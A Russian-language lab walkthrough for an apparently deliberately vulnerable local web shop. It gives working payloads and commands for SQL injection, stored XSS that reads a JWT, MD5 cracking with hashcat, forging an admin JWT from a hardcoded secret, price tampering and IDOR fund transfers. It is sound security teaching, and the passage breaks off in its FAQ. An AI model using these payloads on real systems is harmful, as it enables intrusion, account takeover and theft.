## 1. SQL Injection

### Что это такое?

Представь, что магазин ищет товары вот так (упрощённо):

```
"Ищи в базе всё, где название содержит: " + ТО_ЧТО_ТЫ_НАПИСАЛ
```

Если написать обычный текст — всё нормально. Но если написать специальные символы SQL — можно «вырваться» из поиска и выполнить свой запрос. Буквально как побег из тюрьмы через дыру в стене.

### Как найти уязвимость?

**Метод 1: Через браузер (самый простой)**

1. Открой `http://localhost:5000`
2. В поле поиска введи просто: `'` (один апостроф)
3. Нажми «Найти»

Если сайт вернул ошибку или пустой результат вместо нормального ответа — уязвимость есть. Апостроф «сломал» SQL-запрос.

**Метод 2: Проверка через Swagger**

1. Открой `http://localhost:5000/swagger`
2. Найди раздел **Products** → `GET /api/products/search`
3. Нажми «Try it out»
4. В поле `q` введи: `'`
5. Нажми «Execute»

Посмотри на ответ — ошибка БД = уязвимость подтверждена.

### Как эксплуатировать?

Теперь используем уязвимость, чтобы вытащить всех пользователей с паролями.

**Через браузер — просто вставь в адресную строку:**

```
http://localhost:5000/api/products/search?q=%27%20UNION%20SELECT%201%2CUsername%2CPassword%2CEmail%2CRole%2CBalance%20FROM%20Users--
```

Это та же строка, но закодированная для URL. В «человеческом» виде это:
```sql
' UNION SELECT 1,Username,Password,Email,Role,Balance FROM Users--
```

**Что здесь происходит?**

Оригинальный запрос в коде выглядит так:
```sql
SELECT * FROM Products WHERE Name LIKE '%ТВОЙ_ВВОД%'
```

После нашей инъекции он становится:
```sql
SELECT * FROM Products WHERE Name LIKE '%' 
UNION SELECT 1,Username,Password,Email,Role,Balance FROM Users--'%'
```

`--` это комментарий в SQL — всё после него игнорируется. Мы «склеили» два запроса: исходный (поиск товаров) + свой (вытащить пользователей).

**Результат в браузере:**

```json
[
  {
    "id": 1,
    "name": "admin",
    "description": "0192023a7bbd73250516f069df18b500",
    "price": 9999,
    "stock": 0
  },
  ...
]
```

Вместо товаров вернулись пользователи! В поле `name` — логин, в `description` — хеш пароля. Сохрани эти хеши — пригодятся в уязвимости #4.

**Через Swagger (нагляднее):**

1. `http://localhost:5000/swagger`
2. GET /api/products/search → «Try it out»
3. В поле `q` вставь: `' UNION SELECT 1,Username,Password,Email,Role,Balance FROM Users--`
4. Execute

## 2. Stored XSS

### Что это такое?

XSS (Cross-Site Scripting) — ты сохраняешь JavaScript-код как «отзыв», а когда другой пользователь открывает страницу с отзывами — его браузер запускает твой код. Как будто ты оставил «подарок» на странице, который активируется при открытии.

### Как найти уязвимость?

Посмотрим на код отображения отзывов в `wwwroot/index.html`:

```javascript
// Строка примерно 200+:
<div class="review-content">${r.content}</div>
```

Используется `innerHTML` (неявно через шаблонную строку в HTML). Это опасно — браузер интерпретирует HTML-теги в контенте.

Простейшая проверка: добавь отзыв с текстом `<b>жирный текст</b>`. Если текст отобразился жирным (а не буквально как `<b>жирный текст</b>`) — XSS возможен.

### Как эксплуатировать?

**Шаг 1: Войди как alice**
- Логин: `alice`, пароль: `alice123`

**Шаг 2: Добавь «отзыв» с вредоносным кодом**

Через Swagger:
1. `http://localhost:5000/swagger`
2. Нажми «Authorize» (кнопка с замком) — сначала нужно залогиниться
3. POST /api/auth/login → Try it out → введи `{"username":"alice","password":"alice123"}` → Execute
4. Скопируй `token` из ответа
5. Нажми «Authorize», вставь токен
6. POST /api/products/reviews → Try it out
7. Вставь в тело запроса:

```json
{
  "productId": 1,
  "content": "<img src=x onerror=\"alert('XSS сработал! Я alice и меня взломали')\">",
  "rating": 5
}
```

8. Execute

**Шаг 3: «Жертва» открывает страницу**

1. Открой `http://localhost:5000`
2. Нажми «Отзывы» на первом товаре (Ноутбук Pro X)
3. Сразу выскочит alert с текстом «XSS сработал!»

Это означает: JavaScript выполнился в браузере жертвы. В реальной атаке вместо `alert()` можно:

- Украсть токен: `localStorage.getItem('token')`
- Перенаправить на фишинговый сайт
- Сделать запросы от имени жертвы

**Кража JWT токена через XSS (демо):**

Добавь отзыв с таким содержимым:
```html
<img src=x onerror="alert('Твой токен: ' + localStorage.getItem('token'))">
```

Когда любой залогиненный пользователь откроет отзывы — увидит своих токен в alert'е. В реальной атаке вместо alert отправляется на сервер злоумышленника.

## 3. Вечный JWT токен

### Что это такое?

JWT (JSON Web Token) — это как пропуск в клуб. Обычно пропуска выдаются на ограниченное время (например, на 1 час). Здесь пропуска бессрочные — раз получил и пользуйся вечно.

### Как найти уязвимость?

**Шаг 1: Получи токен**

1. Swagger → POST /api/auth/login
2. Тело: `{"username":"alice","password":"alice123"}`
3. Скопируй `token` из ответа. Выглядит как:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIy...
```

**Шаг 2: Декодируй токен**

1. Открой сайт `https://jwt.io`
2. Вставь токен в поле «Encoded» слева
3. Справа появится содержимое токена (Payload):

```json
{
  "userId": "2",
  "username": "alice",
  "role": "user"
}
```

**Обрати внимание:** нет поля `exp` (expiration — истечение срока). Обычно оно выглядит как `"exp": 1735000000`. Его отсутствие = токен вечный.

**Шаг 3: Проверь что токен работает «завтра»**

Это можно сделать программно. Но на уровне демо — сохрани токен, подожди минуту, и используй снова:

```bash
# Сохрани токен (замени TOKEN на реальный)
TOKEN="eyJhbGci..."

# Используй через минуту — всё равно работает
curl http://localhost:5000/api/auth/me -H "Authorization: Bearer $TOKEN"
```

Токен будет работать даже через год — сервер не проверяет срок.

### Почему это опасно?

Если токен украли (через XSS, перехват трафика, утечку логов) — жертва никак не может его «сломать». Нельзя «выйти из системы» на стороне сервера. Единственный способ — перезапустить весь сервер.

## 4. Взлом MD5 пароля

### Что это такое?

Пароли нельзя хранить в открытом виде — их хешируют (превращают в набор символов). Но MD5 — это старый алгоритм, который давно взломан. Специальные базы («радужные таблицы») хранят миллиарды паролей и их MD5-хешей. Нашёл хеш → нашёл пароль за секунды.

### Как найти хеш пароля?

**Способ 1: Через SQL Injection (VULN-1)**

Мы уже делали это выше. В ответе поле `description` содержало MD5 хеш.

**Способ 2: Через API (хеш виден в ответе)**

1. Войди под любым пользователем
2. Swagger → GET /api/auth/me → Execute

Ответ:
```json
{
  "id": 2,
  "username": "alice",
  "email": "alice@example.com",
  "role": "user",
  "balance": 1000,
  "password": "4b68c1fd2bfb035258d0f865b9150cb0"  ← хеш пароля!
}
```

Сервер прямо отдаёт хеш пароля в ответе — это грубая ошибка.

### Как взломать MD5?

**Метод 1: Онлайн-сервис (самый простой, 5 секунд)**

1. Открой `https://crackstation.net/`
2. Вставь хеш: `4b68c1fd2bfb035258d0f865b9150cb0`
3. Нажми «Crack Hashes»
4. Результат: `alice123`

Или через `https://md5decrypt.net/` — та же история.

**Метод 2: hashcat (для понимания как это работает)**

```bash
# Установи hashcat: https://hashcat.net/hashcat/

# Создай файл с хешем
echo "4b68c1fd2bfb035258d0f865b9150cb0" > hashes.txt

# Создай файл с паролями для перебора
echo -e "password\n123456\nalice123\nadmin123\nqwerty" > wordlist.txt

# Запусти взлом (-m 0 = MD5)
hashcat -m 0 hashes.txt wordlist.txt

# Результат появится в строке вида:
# 4b68c1fd2bfb035258d0f865b9150cb0:alice123
```

**Что значит этот хеш?**

```
MD5("alice123") = 4b68c1fd2bfb035258d0f865b9150cb0
```

Можно проверить самому:
```bash
echo -n "alice123" | md5sum
# → 4b68c1fd2bfb035258d0f865b9150cb0
```

## 5. Подделка JWT токена

### Что это такое?

JWT токен подписывается секретным ключом. Если знаешь ключ — можешь создать любой токен с любыми данными (например, `"role": "admin"`). Здесь ключ — это `"secret123"`, прямо в исходном коде.

### Как найти уязвимость?

Открой файл `ShopLab/Program.cs`:

```csharp
// Строка примерно 11:
var jwtSecret = "secret123"; // УЯЗВИМОСТЬ: слабый и захардкоженный секрет
```

Ключ буквально написан в коде. Если код публичный (GitHub) — любой может его найти.

### Как эксплуатировать?

Нам нужен Python. Установи если нет: https://python.org

```bash
# Установи библиотеку для JWT
pip install PyJWT
```

Создай файл `forge_token.py`:

```python
import jwt

# Секрет из исходного кода Program.cs
secret = "secret123"

# Создаём токен от имени admin с правами admin
# (мы не знаем пароль admin, но это не важно!)
fake_token = jwt.encode(
    {
        "userId": "1",
        "username": "admin",
        "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "admin"
    },
    secret,
    algorithm="HS256"
)

print("Поддельный токен:")
print(fake_token)
```

Запусти:
```bash
python forge_token.py
```

Получишь токен. Используй его для входа как admin:

```bash
TOKEN="eyJhbGci..."  # вставь свой токен

# Получить список всех пользователей (только для admin)
curl http://localhost:5000/api/auth/users \
  -H "Authorization: Bearer $TOKEN"
```

Если вернулся список пользователей — ты вошёл как admin без знания пароля!

**Проверка через Swagger:**

1. Swagger → кнопка «Authorize»
2. Введи: `Bearer [твой_поддельный_токен]`
3. GET /api/auth/users → Execute
4. Видишь всех пользователей? Взлом удался.

## 6. Подделка цены (Логическая ошибка)

### Что это такое?

Приложение принимает цену товара от самого пользователя. Это как прийти в магазин и самому написать цену на ценнике — кассир спросит сколько платить, и ты скажешь «1 рубль».

### Как найти уязвимость?

Посмотри на фронтенд — в форме покупки есть поле «Цена за ед.»:

```html
<input id="buy-price" type="number" placeholder="${price}">
```

И в коде покупки (`Controllers/OrdersController.cs`):

```csharp
decimal price = req.ClientPrice.HasValue ? req.ClientPrice.Value : product.Price;
decimal totalPrice = price * quantity; // цена от клиента!
```

Сервер буквально говорит: «Если клиент прислал цену — используем её».

### Как эксплуатировать?

**Вариант А: Купить за 1 копейку (через сайт)**

1. Войди на `http://localhost:5000` (alice/alice123)
2. Нажми «Купить» на ноутбуке за 49 999 ₽
3. В поле «Цена за ед.» введи `0.01`
4. Нажми «Подтвердить покупку»
5. Проверь баланс в профиле — спишется всего 0.01 ₽!

**Вариант Б: Купить за отрицательное количество → получить деньги**

Это делается через Swagger или curl (фронтенд ограничивает `min="1"`, но сервер не проверяет).

Через curl (замени TOKEN на реальный):
```bash
# Сначала залогинься
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Токен: $TOKEN"

# Купить -1 штуки товара по стандартной цене
curl -X POST http://localhost:5000/api/orders/purchase \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId": 5, "quantity": -1}'
```

Результат: `totalPrice = -2499` → баланс alice увеличится на 2499 ₽!

**Через Swagger:**
1. Авторизуйся (POST /auth/login, скопируй токен, вставь в Authorize)
2. POST /api/orders/purchase → Try it out
3. Тело:
```json
{
  "productId": 5,
  "quantity": -1,
  "clientPrice": null
}
```
4. Execute — смотри что totalPrice отрицательный

## 7. IDOR — чужие данные и чужие деньги

### Что это такое?

IDOR (Insecure Direct Object Reference) — сервер не проверяет, принадлежит ли тебе то, что ты запрашиваешь. Как если бы ячейки в банке были пронумерованы 1, 2, 3... и любой мог открыть любую ячейку, просто зная номер.

Здесь два места:
- `/api/orders/{id}` — можно смотреть чужие заказы
- `/api/orders/transfer` — можно переводить деньги с чужого счёта

### Как эксплуатировать IDOR в заказах?

**Шаг 1: Войди как bob**

В Swagger: POST /api/auth/login с `{"username":"bob","password":"bob123"}`, скопируй токен.

**Шаг 2: Сначала сделай заказ под alice**

Открой новую вкладку браузера или используй incognito, войди как alice (alice/alice123), купи любой товар через сайт.

**Шаг 3: Под токеном bob — просматривай заказы alice**

```bash
# Токен bob
TOKEN_BOB="eyJ..."

# Пробуем посмотреть заказ #1 (он принадлежит другому пользователю)
curl http://localhost:5000/api/orders/1 \
  -H "Authorization: Bearer $TOKEN_BOB"
```

Или в Swagger:
1. Авторизуйся токеном bob
2. GET /api/orders/{id} → Try it out → id: `1` → Execute

Ответ покажет чужой заказ: имя владельца, товар, сумму. Bob не должен этого видеть!

**Шаг 4: Перевод денег с чужого счёта**

Допустим, bob (ID=3) хочет забрать деньги у admin (ID=1, баланс 9999 ₽).

```bash
TOKEN_BOB="eyJ..."

curl -X POST http://localhost:5000/api/orders/transfer \
  -H "Authorization: Bearer $TOKEN_BOB" \
  -H "Content-Type: application/json" \
  -d '{
    "fromUserId": 1,
    "toUserId": 3,
    "amount": 9999
  }'
```

Ответ: `"message": "Переведено 9999 ₽ с аккаунта #1 на #3"`

Bob перевёл деньги admin'а себе! Сервер не проверил, что bob — это не admin.

Проверь через Swagger GET /api/auth/me (под токеном bob) — увидишь увеличившийся баланс.

## ❓ Частые проблемы

**Q: curl не работает на Windows**  
A: Используй Git Bash (https://git-scm.com) или PowerShell — там есть `Invoke-WebRequest`. Либо всё делай через Swagger.

**Q: Swagger просит авторизацию и не пускает**  
A: Сначала выполни POST /api/auth/login, скопируй токен из ответа, нажми кнопку «Authorize» вверху страницы Swagger, введи токен в поле.

**Q: Python говорит "No module named jwt"**
